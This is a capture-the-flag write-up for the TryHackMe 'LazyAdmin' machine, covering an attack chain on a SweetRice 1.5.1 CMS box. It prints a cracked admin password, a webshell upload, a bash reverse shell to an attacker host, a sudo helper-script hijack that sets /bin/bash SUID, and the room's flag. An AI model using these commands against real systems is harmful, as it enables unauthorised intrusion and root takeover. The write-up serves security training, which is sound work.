# LazyAdmin - TryHackMe Writeup

**Target:** `TARGET_IP` (10.130.171.51 at time of solve)
**OS:** Linux (Ubuntu 16.04)
**Difficulty:** Easy
**Tech stack:** Apache 2.4.18, SweetRice CMS 1.5.1
**Exploit chain:** exposed SQL backup (admin MD5) ? CrackStation ? SweetRice Media Center ZIP upload ? reverse shell as `www-data` ? `sudo perl backup.pl` ? world-writable `/etc/copy.sh` ? SUID `bash` ? root

---

## Attack Chain Overview

```
nmap ? 22/tcp OpenSSH 7.2p2, 80/tcp Apache 2.4.18
    ?
feroxbuster /  ?  /content/inc/mysql_backup/*.sql + /content/inc/cache/cache.db
    ?
wget everything + grep SQL dump ? MD5 42f749ade7f9e195bf475f37a44cafcb
    ?
CrackStation ? Password123  (user "manager")
    ?
SweetRice 1.5.1 admin panel (/content/as/) ? Media Center ZIP upload
    ?
PHP webshell at /content/attachment/<md5>.php ? reverse shell as www-data
    ?
Loot user.txt + /home/itguy/mysql_login.txt  (rice:randompass)
    ?
sudo -l  ?  (ALL) NOPASSWD /usr/bin/perl /home/itguy/backup.pl
    ?
backup.pl calls /etc/copy.sh (world-writable)
    ?
echo 'chmod u+s /bin/bash' > /etc/copy.sh  +  sudo perl backup.pl
    ?
bash -p ? root.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Loot the Exposed SQL Backup](#3-loot-the-exposed-sql-backup)
4. [Initial Access  SweetRice CMS Media Center RCE](#4-initial-access--sweetrice-cms-media-center-rce)
5. [Post-Exploitation (`www-data`)](#5-post-exploitation-www-data)
6. [Privilege Escalation  sudo perl + writable helper](#6-privilege-escalation--sudo-perl--writable-helper)
7. [Root Flag](#7-root-flag)
8. [Key Takeaways](#8-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run a full port scan and service enumeration.
# Why here: identify active services like SSH and Apache to map the initial attack surface.
nmap -sS -p- -n -Pn $TARGET
nmap -sVC -p22,80 $TARGET -oA service
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | Apache httpd 2.4.18 (Ubuntu) |

Quick exploit DB check on the SSH banner:

```bash
# What it does: search for exploits matching the detected OpenSSH version.
# Why here: evaluate if remote exploitation of the SSH service is feasible for initial access.
searchsploit OpenSSH 7.2p2
# OpenSSH 7.2p2 - Username Enumeration   | linux/remote/40136.py
```

CVE-2016-6210 is a username enumeration oracle  handy if spraying, but not a foothold by itself. Parked; focus on the web.

---

## 2. Web Enumeration

```bash
# What it does: perform directory and file discovery with a medium-sized wordlist.
# Why here: identify the hidden SweetRice CMS installation and exposed database backups.
feroxbuster -u http://$TARGET \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
```

High-signal paths:

```
http://$TARGET/content/inc/cache/cache.db
http://$TARGET/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
http://$TARGET/content/as/lib/app_sqlite.sql
http://$TARGET/content/as/lib/app_pgsql.sql
http://$TARGET/content/as/                     ? SweetRice admin panel
```

---

## 3. Loot the Exposed SQL Backup

Mirror every database-related artefact:

```bash
# What it does: download the discovered SQL backup and database files.
# Why here: exfiltrate sensitive data for offline analysis, specifically searching for administrative credentials.
wget http://$TARGET/content/inc/cache/cache.db
wget http://$TARGET/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
wget http://$TARGET/content/as/lib/app_sqlite.sql
wget http://$TARGET/content/as/lib/app_pgsql.sql
wget http://$TARGET/content/as/lib/app.sql
```

### `cache.db`  Berkeley DB, not SQLite

```bash
# What it does: usa un cliente o herramienta de volcado de base de datos.
# Why here: enumerar datos y extraer credenciales o estado de la app.
sqlite3 cache.db           # not a SQLite file
# What it does: identifies file type and metadata.
# Why here: choose the correct parser or technique.
file cache.db              # ? Berkeley DB
# What it does: instala la herramienta o paquete local necesario.
# Why here: tener disponible el helper antes de ejecutar la tecnica.
sudo apt-get install db-util
db_dump -p cache.db
# db_array_2e105254be2ecfedabac66868dcec9b6 1575023409
# db_array_c6eab5be6c45d8a0884ede5a56c5d7d3 1575023409
# ...
```

Dump is a list of hash ? timestamp entries  no immediate credential. Move on.

### `mysql_bakup_*.sql`  jackpot

```bash
head -100 mysql_bakup_20191129023059-1.5.1.sql
```

Buried in a serialised PHP array:

```
s:5:\"admin\";s:7:\"manager\";
s:6:\"passwd\";s:32:\"42f749ade7f9e195bf475f37a44cafcb\";
```

Raw MD5 ? CrackStation (hashcat `-m 0` also works):

```
42f749ade7f9e195bf475f37a44cafcb : Password123
```

**Admin credentials:** `manager / Password123`.

Full pattern: [backup-file-exposure.md](../../exploits/web-disclosure/backup-file-exposure.md).

---

## 4. Initial Access  SweetRice CMS Media Center RCE

Full technique note: [sweetrice-media-center-rce.md](../../exploits/web-rce/sweetrice-media-center-rce.md).

Login:
```
http://$TARGET/content/as/
user: manager
pass: Password123
```

SweetRice 1.5.1 is EOL; its Media Center accepts ZIP uploads and unpacks them under `/content/attachment/`. Prepackaged PoC ZIP:

```
https://github.com/weekevy/SweetRice-CMS-1.5.1-RCE-Exploit/blob/main/shell.zip
```

Upload it via **Media Center ? Attach new medium**. The extracted PHP shell shows up in the listing with a random MD5 filename.

```bash
# Sanity check
# What it does: test the uploaded PHP shell for command execution.
# Why here: verify that the SweetRice ZIP upload exploit was successful and we have RCE.
curl "http://$TARGET/content/attachment/55db1b618c6ed7a8b5a572345fc45009.php?cmd=id"

# Attacker: nc -lvnp 4444

# Reverse shell
curl "http://$TARGET/content/attachment/55db1b618c6ed7a8b5a572345fc45009.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/$LHOST/4444%200>%261'"
```

Lands as **`www-data`** on `THM-Chal`.

---

## 5. Post-Exploitation (`www-data`)

Standard [Linux enumeration](../../exploits/enumeration/linux-enumeration.md) pass:

```bash
# What it does: verify the current user identity in the reverse shell.
# Why here: confirm we are running as 'www-data' and begin local enumeration.
whoami
id
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /etc/passwd | grep bash
# root:x:0:0:root:/root:/bin/bash
# itguy:x:1000:1000:THM-Chal,,,:/home/itguy:/bin/bash
# guest-3myc2b:x:998:998:Guest:/tmp/guest-3myc2b:/bin/bash
groups
```

The user flag lives in `itguy`'s home (world-readable):

```bash
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /home/itguy/user.txt
# THM{63e5bce9271952aad1113b6f1ac28a07}
cat /home/itguy/mysql_login.txt
# rice:randompass
```

Spotted: a `backup.pl` in the same home  pin for the privesc step.

---

## 6. Privilege Escalation  sudo perl + writable helper

```bash
# What it does: check the 'www-data' user's sudo permissions.
# Why here: identify the backup.pl script that can be run via sudo, pointing to a privilege escalation path.
sudo -l
# User www-data may run the following commands on THM-Chal:
#     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

# What it does: lists directory contents.
# Why here: verificar archivos, permisos o loot en la ruta actual.
ls -la /home/itguy/backup.pl
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /home/itguy/backup.pl
# ...
# system("sh", "/etc/copy.sh");
# ...
```

The sudo-allowed script (`backup.pl`) is itself untouchable, but it shells out to `/etc/copy.sh`  which is world-writable:

```bash
# What it does: lists directory contents.
# Why here: verificar archivos, permisos o loot en la ruta actual.
ls -la /etc/copy.sh
# -rwxrwxrwx 1 root root ... /etc/copy.sh
```

Full technique: [sudo-script-helper-hijack.md](../../exploits/privesc-linux/sudo-script-helper-hijack.md).

```bash
# 1. Replace the helper with the payload
# What it does: replace the contents of the world-writable /etc/copy.sh script with a SUID payload.
# Why here: leverage the sudo-allowed backup.pl script to execute our payload as root.
echo 'chmod u+s /bin/bash' > /etc/copy.sh

# 2. Trigger via the sudo-allowed outer script
# What it does: execute the backup.pl script via sudo.
# Why here: trigger the execution of the hijacked /etc/copy.sh script as root.
sudo /usr/bin/perl /home/itguy/backup.pl

# 3. /bin/bash is now SUID root
# What it does: lists directory contents.
# Why here: verificar archivos, permisos o loot en la ruta actual.
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash

# 4. -p preserves the elevated EUID
bash -p
# What it does: verify the root shell.
# Why here: confirm successful privilege escalation to the root user.
whoami           # root
id
```

---

## 7. Root Flag

```bash
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /root/root.txt
```

---

## 8. Key Takeaways

- Always mirror any `/backup/`, `/dump/`, `*.sql`, `*.db` paths feroxbuster produces  admin hashes often end up in CMS SQL exports.
- `file <x>.db` before `sqlite3`. LazyAdmin's `cache.db` was a Berkeley DB  `db_dump -p` is the right tool.
- MD5 ? CrackStation is still the fastest crack for a random "admin" password in a CTF. If it fails, `hashcat -m 0` with rockyou is the next stop.
- SweetRice 1.5.1 Media Center accepts ZIP uploads and extracts PHP  treat any reachable SweetRice instance as RCE.
- When `sudo -l` allows a script, **also check every fixed path that script calls**. The privesc is often against the helper, not the allowed binary.

---

## Related Notes
- [backup-file-exposure.md](../../exploits/web-disclosure/backup-file-exposure.md)  exposed `.sql` / `.db` in webroot
- [sweetrice-media-center-rce.md](../../exploits/web-rce/sweetrice-media-center-rce.md)  authenticated RCE chain
- [sudo-script-helper-hijack.md](../../exploits/privesc-linux/sudo-script-helper-hijack.md)  privesc via writable helper
- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md)  post-foothold checklist
- [searchsploit](../../tools/recon/searchsploit.md), [wget](../../tools/web/wget.md), [sqlite3](../../tools/database/sqlite3.md)  tool notes for this chain
- [nmap](../../tools/recon/nmap.md), [feroxbuster](../../tools/fuzz/feroxbuster.md)  recon



